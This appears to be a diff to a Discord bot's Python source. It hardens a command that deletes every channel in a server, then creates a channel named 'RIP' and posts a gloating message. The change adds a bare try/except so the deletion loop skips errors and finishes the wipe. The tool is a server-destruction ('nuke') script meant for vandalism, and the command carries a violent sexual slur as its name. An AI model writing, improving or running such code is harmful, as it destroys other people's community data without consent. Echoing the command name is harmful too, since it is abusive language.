@@ -135,8 +135,11 @@ async def h(ctx):
 @client.command(pass_context=True)
 async def rape(ctx):
         for channel in list(ctx.message.guild.channels):
-            await channel.delete()
-            print (channel.name + " has been deleted")
+            try:
+                await channel.delete()
+                print (channel.name + " has been deleted")
+            except:
+                pass
         guild = ctx.message.guild
         channel = await guild.create_text_channel( 'RIP')
         await channel.send( "Now that's alot of damage!!")
